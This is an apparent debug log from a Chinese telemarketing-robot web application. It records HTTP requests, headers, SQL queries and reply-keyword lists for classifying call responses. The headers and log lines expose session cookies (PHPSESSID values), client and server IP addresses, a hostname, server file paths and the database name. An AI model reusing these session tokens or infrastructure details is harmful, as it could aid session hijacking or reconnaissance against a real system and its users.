[ sql ] [ SQL ] SELECT `id`,`name`,`type`,`keyword` FROM `rk_tel_knowledge` WHERE  `scenarios_id` = 561  AND `type` IN (2,3,4,5,6) [ RunTime:0.000151s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/defaultmt
[ log ] code=0#msg=有数据了#data=[{"id":12408,"name":"\u80af\u5b9a","type":2,"keyword":"\u597d\u7684,\u6ca1\u95ee\u9898,\u540c\u610f,\u6709\u5174\u8da3,\u662f\u7684,\u5c31\u662f,\u5bf9\u7684,\u5f53\u7136,\u786e\u5b9a,\u6beb\u65e0\u7591\u95ee,\u53ef\u4ee5,\u53ef\u4ee5\u8003\u8651,\u9700\u8981,\u6709\u7684,\u8bf7\u8bf4,\u8003\u8651,\u90a3\u4f60\u8bf4\u5427,\u4f60\u7ee7\u7eed,\u4f60\u7ee7\u7eed\u8bf4,\u77e5\u9053,\u8bf4\u8bf4\u770b,\u8fd9\u4e2a\u6211\u77e5\u9053,\u60a8\u4ecb\u7ecd\u4e00\u4e0b\u5427,\u5927\u4f53\u77e5\u9053,\u597d\u5f97,\u597d\u4e86,\u6211\u8003\u8651\u4e00\u4e0b,\u633a\u597d,\u4e0d\u9519,ok,OK,\u7136\u540e,\u8fd8\u53ef\u4ee5,\u633a\u597d\u7684,\u6709\u70b9\u5370\u8c61,\u6211\u8003\u8651,\u90a3\u884c,\u8fd9\u6837\u5b50\u554a,\u597d\u597d,\u600e\u4e48\u6837,\u4ec0\u4e48\u6837,\u8fd9\u6837\u554a,\u5927\u6982\u6e05\u695a,\u5bf9\u7684,\u4f60\u8bf4,\u4e86\u89e3,\u77e5\u9053\u4e86,\u8003\u8651\u5f97,\u542c\u660e\u767d\u4e86,\u6211\u5728,\u4f60\u8bf4\u4e00\u4e0b,\u6709\u8fc7,\u6709\u9700\u8981,\u6536\u5230\u4e86,\u6536\u5230,\u6211\u9700\u8981"},{"id":12409,"name":"\u5426\u5b9a","type":3,"keyword":"\u4e0d\u540c\u610f,\u4e0d\u7528,\u4e0d\u60f3,\u6ca1\u6709,\u4e0d\u53ef\u4ee5,\u4e0d\u662f,\u4e0d\u5bf9,\u4e0d\u662f\u7684,\u4e0d\u597d,\u4e0d\u6e05\u695a,\u4e0d\u77e5\u9053,\u8fd9\u4e2a\u6211\u4e0d\u6e05\u695a,\u63a5\u53d7\u4e0d\u4e86,\u4e0d\u884c,\u4e0d\u8981,\u6ca1\u53bb\u8fc7,\u6ca1\u6709\u6253\u7b97"},{"id":12410,"name":"\u62d2\u7edd","type":4,"keyword":"\u4e0d\u8003\u8651,\u6ca1\u60f3\u6cd5,\u4e0d\u611f\u5174\u8da3,\u8fd9\u4e2a\u4e0d\u8003\u8651,\u4e0d\u597d\u7684,\u6ca1\u4eba\u8981,\u6ca1\u8003\u8651,\u6682\u65f6\u6ca1\u9700\u8981,\u6ca1\u9700\u8981,\u4e0d\u9700\u8981,\u4e0d\u592a\u9700\u8981,\u6682\u65f6\u4e0d\u9700\u8981,\u4e0d\u6253\u7b97,\u7528\u4e0d\u5230,\u627e\u522b\u4eba"},{"id":12411,"name":"\u4e2d\u6027","type":5,"keyword":"\u4e0d\u9519,\u4e86\u89e3,\u505a\u8fc7,\u53ef\u4ee5,\u542c\u8bf4\u8fc7,\u542c\u8fc7,\u591f\u4e86,\u591f\u7684,\u633a\u597d,\u719f\u6089,\u77e5\u9053,\u7ed9\u529b,\u7ee7\u7eed,\u8ba4\u53ef,\u5dee\u4e0d\u591a,\u8fd8\u4e0d\u9519,\u8fd8\u597d,\u5177\u4f53\u70b9"},{"id":12412,"name":"\u672a\u8bc6\u522b","type":6,"keyword":"XXX"}]
---------------------------------------------------------------
[ 2019-09-26T17:55:38+08:00 ] 172.16.170.169 61.144.211.69 POST /user/scenarios/defaultmt
[ info ] s-6-2111.pssdss.com/user/scenarios/defaultmt [运行时间：0.037734s][吞吐率：26.50req/s] [内存消耗：4,632.73kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'scenarios',
    2 => 'defaultmt',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'content-length' => '26',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://s-6-2111.pssdss.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
)
[ info ] [ PARAM ] array (
  'sceneId' => '561',
  'processId' => '3119',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\scenarios->defaultMt[ /www/wwwroot/web/application/user/controller/Scenarios.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000331s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000627s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000161s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000656s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000138s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000436s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000121s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000438s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000232s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000424s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000120s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000406s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000131s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000260s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_tel_knowledge` [ RunTime:0.000453s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`type`,`keyword` FROM `rk_tel_knowledge` WHERE  `scenarios_id` = 561  AND `type` IN (2,3,4,5,6) [ RunTime:0.000168s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:38function=user/scenarios/defaultmt
[ log ] code=0#msg=有数据了#data=[{"id":12408,"name":"\u80af\u5b9a","type":2,"keyword":"\u597d\u7684,\u6ca1\u95ee\u9898,\u540c\u610f,\u6709\u5174\u8da3,\u662f\u7684,\u5c31\u662f,\u5bf9\u7684,\u5f53\u7136,\u786e\u5b9a,\u6beb\u65e0\u7591\u95ee,\u53ef\u4ee5,\u53ef\u4ee5\u8003\u8651,\u9700\u8981,\u6709\u7684,\u8bf7\u8bf4,\u8003\u8651,\u90a3\u4f60\u8bf4\u5427,\u4f60\u7ee7\u7eed,\u4f60\u7ee7\u7eed\u8bf4,\u77e5\u9053,\u8bf4\u8bf4\u770b,\u8fd9\u4e2a\u6211\u77e5\u9053,\u60a8\u4ecb\u7ecd\u4e00\u4e0b\u5427,\u5927\u4f53\u77e5\u9053,\u597d\u5f97,\u597d\u4e86,\u6211\u8003\u8651\u4e00\u4e0b,\u633a\u597d,\u4e0d\u9519,ok,OK,\u7136\u540e,\u8fd8\u53ef\u4ee5,\u633a\u597d\u7684,\u6709\u70b9\u5370\u8c61,\u6211\u8003\u8651,\u90a3\u884c,\u8fd9\u6837\u5b50\u554a,\u597d\u597d,\u600e\u4e48\u6837,\u4ec0\u4e48\u6837,\u8fd9\u6837\u554a,\u5927\u6982\u6e05\u695a,\u5bf9\u7684,\u4f60\u8bf4,\u4e86\u89e3,\u77e5\u9053\u4e86,\u8003\u8651\u5f97,\u542c\u660e\u767d\u4e86,\u6211\u5728,\u4f60\u8bf4\u4e00\u4e0b,\u6709\u8fc7,\u6709\u9700\u8981,\u6536\u5230\u4e86,\u6536\u5230,\u6211\u9700\u8981"},{"id":12409,"name":"\u5426\u5b9a","type":3,"keyword":"\u4e0d\u540c\u610f,\u4e0d\u7528,\u4e0d\u60f3,\u6ca1\u6709,\u4e0d\u53ef\u4ee5,\u4e0d\u662f,\u4e0d\u5bf9,\u4e0d\u662f\u7684,\u4e0d\u597d,\u4e0d\u6e05\u695a,\u4e0d\u77e5\u9053,\u8fd9\u4e2a\u6211\u4e0d\u6e05\u695a,\u63a5\u53d7\u4e0d\u4e86,\u4e0d\u884c,\u4e0d\u8981,\u6ca1\u53bb\u8fc7,\u6ca1\u6709\u6253\u7b97"},{"id":12410,"name":"\u62d2\u7edd","type":4,"keyword":"\u4e0d\u8003\u8651,\u6ca1\u60f3\u6cd5,\u4e0d\u611f\u5174\u8da3,\u8fd9\u4e2a\u4e0d\u8003\u8651,\u4e0d\u597d\u7684,\u6ca1\u4eba\u8981,\u6ca1\u8003\u8651,\u6682\u65f6\u6ca1\u9700\u8981,\u6ca1\u9700\u8981,\u4e0d\u9700\u8981,\u4e0d\u592a\u9700\u8981,\u6682\u65f6\u4e0d\u9700\u8981,\u4e0d\u6253\u7b97,\u7528\u4e0d\u5230,\u627e\u522b\u4eba"},{"id":12411,"name":"\u4e2d\u6027","type":5,"keyword":"\u4e0d\u9519,\u4e86\u89e3,\u505a\u8fc7,\u53ef\u4ee5,\u542c\u8bf4\u8fc7,\u542c\u8fc7,\u591f\u4e86,\u591f\u7684,\u633a\u597d,\u719f\u6089,\u77e5\u9053,\u7ed9\u529b,\u7ee7\u7eed,\u8ba4\u53ef,\u5dee\u4e0d\u591a,\u8fd8\u4e0d\u9519,\u8fd8\u597d,\u5177\u4f53\u70b9"},{"id":12412,"name":"\u672a\u8bc6\u522b","type":6,"keyword":"XXX"}]
---------------------------------------------------------------
[ 2019-09-26T17:55:58+08:00 ] 172.16.170.169 61.144.211.69 GET /user/manager/editadmin/id/5555
[ info ] s-6-2111.pssdss.com/user/manager/editadmin/id/5555 [运行时间：0.044666s][吞吐率：22.39req/s] [内存消耗：4,448.96kb] [文件加载：60]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'manager',
    2 => 'editadmin',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://s-6-2111.pssdss.com/user/scenarios/scene',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=74',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '5555',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\user\controller\Manager->editAdmin[ /www/wwwroot/web/application/user/controller/Manager.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/manager/addadmin.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
  8 => 'list',
  9 => 'picdata',
  10 => 'current',
) ]
[ info ] [ RUN ] app\common\widget\Form->show[ /www/wwwroot/web/application/common/widget/Form.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/common/view/default/form/image.html [ array (
  0 => 'type',
  1 => 'field',
  2 => 'value',
  3 => 'size',
  4 => 'option',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000304s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000689s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000208s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000617s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000172s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000483s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000135s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000501s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000256s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000438s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000128s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000422s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000149s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000276s ]
[ sql ] [ SQL ] SELECT * FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000344s ]
[ log ] ###user_id=5555time=2019-09-26 17:55:58function=user/manager/editadmin
---------------------------------------------------------------
[ 2019-09-26T18:21:18+08:00 ] 172.16.170.169 61.144.211.69 GET /favicon.ico
[ info ] s-6-2111.pssdss.com/favicon.ico [运行时间：0.014885s][吞吐率：67.18req/s] [内存消耗：1,658.46kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=75',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-09-26T18:35:35+08:00 ] 172.16.170.169 109.95.206.10 GET /
[ info ] 47.96.126.228:80/ [运行时间：0.027716s][吞吐率：36.08req/s] [内存消耗：3,922.77kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000408s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000623s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000197s ]
---------------------------------------------------------------
[ 2019-09-26T18:36:22+08:00 ] 172.16.170.169 61.144.211.69 GET /user/manager/sales
[ info ] s-6-2111.pssdss.com/user/manager/sales [运行时间：0.039567s][吞吐率：25.27req/s] [内存消耗：4,333.78kb] [文件加载：59]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'manager',
    2 => 'sales',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 's-6-2111.pssdss.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://s-6-2111.pssdss.com/user/manager/editadmin/id/5555',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'UM_distinctid=16d6c8b79651ab-08a096c8ef9d42-3c604504-100200-16d6c8b7966128; PHPSESSID=e02e5kq1lu13a763nv4o1ovj95; __guid=153879994.2269271795423239000.1569485916108.8096; __forward__=%2Fuser%2Fmenu%2Findex; monitor_count=75',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\user\controller\Manager->sales[ /www/wwwroot/web/application/user/controller/Manager.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/manager/sales.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
  8 => 'list',
  9 => 'page',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000306s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000632s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000165s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000620s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` = 5555 LIMIT 1 [ RunTime:0.000169s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000432s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` = 12 LIMIT 1 [ RunTime:0.000120s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000429s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (31,78,112,175,127,129,198,136,140,164,180,182,183,162,163,181,167,168,172,174,169,186,187,177,178,179,188,184,189,192,193,194,195,196,197,199,128,130) [ RunTime:0.000251s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000418s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000120s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000417s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = 5555  AND `status` = 0 LIMIT 1 [ RunTime:0.000129s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN (31,78,112,127,128,129,130,136,140,162,163,164,167,168,169,172,174,175,177,178,179,180,181,182,183,184,186,187,188,189,192,193,194,195,196,197,198,199) ORDER BY sort asc [ RunTime:0.000239s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `rk_admin` WHERE  `pid` = 5555  AND `user_type` = 1 LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SELECT * FROM `rk_admin` WHERE  `pid` = 5555  AND `user_type` = 1 LIMIT 0,10 [ RunTime:0.000174s ]
[ log ] ###user_id=5555time=2019-09-26 18:36:22function=user/manager/sales
---------------------------------------------------------------
[ 2019-09-26T19:15:37+08:00 ] 172.16.170.169 104.199.152.2 GET /
[ info ] 47.96.126.228/ [运行时间：0.030324s][吞吐率：32.98req/s] [内存消耗：3,922.41kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000361s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000747s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000178s ]
---------------------------------------------------------------
[ 2019-09-26T21:40:52+08:00 ] 172.16.170.169 42.236.10.75 GET /
[ info ] 47.96.126.228/ [运行时间：0.028427s][吞吐率：35.18req/s] [内存消耗：3,924.23kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'upgrade-insecure-requests' => '1',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000373s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000876s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000226s ]
---------------------------------------------------------------
[ 2019-09-26T21:40:53+08:00 ] 172.16.170.169 42.236.10.75 GET /
[ info ] 47.96.126.228/ [运行时间：0.027161s][吞吐率：36.82req/s] [内存消耗：3,924.66kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.baidu.com/',
  'accept-encoding' => 'gzip, deflate',
  'cookie' => 'PHPSESSID=lnd2kdjq61k0sb63gi56i9foi3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000355s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000664s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000162s ]
---------------------------------------------------------------
[ 2019-09-26T21:40:55+08:00 ] 172.16.170.169 42.236.10.78 GET /user/index/login
[ info ] 47.96.126.228/user/index/login [运行时间：0.032907s][吞吐率：30.39req/s] [内存消耗：3,962.90kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.baidu.com/',
  'accept-encoding' => 'gzip, deflate',
  'cookie' => 'PHPSESSID=lnd2kdjq61k0sb63gi56i9foi3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
